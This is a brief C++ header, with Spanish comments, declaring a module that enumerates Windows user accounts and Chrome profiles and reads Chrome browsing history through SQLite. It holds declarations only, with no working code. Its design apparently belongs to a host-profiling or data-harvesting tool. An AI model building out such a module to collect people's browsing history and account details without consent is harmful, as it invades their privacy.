#ifndef __MOD_INFO
#define __MOD_INFO 1

#include "headers.hpp"
#include<LMaccess.h>
#include<LMerr.h>
#include<LMAPIbuf.h>
#include "../sqlite3/sqlite3.h"

struct Chrome_History {
	std::string strURL;
	std::string strDate;
};

class mod_Info {	
	public:
		//Probar para mostrar toda la info
		void test_Data();

		void test_SQL();
	private:
		std::vector<std::string> m_ChromeProfiles();
		std::vector<std::string> m_Usuarios();

};

#endif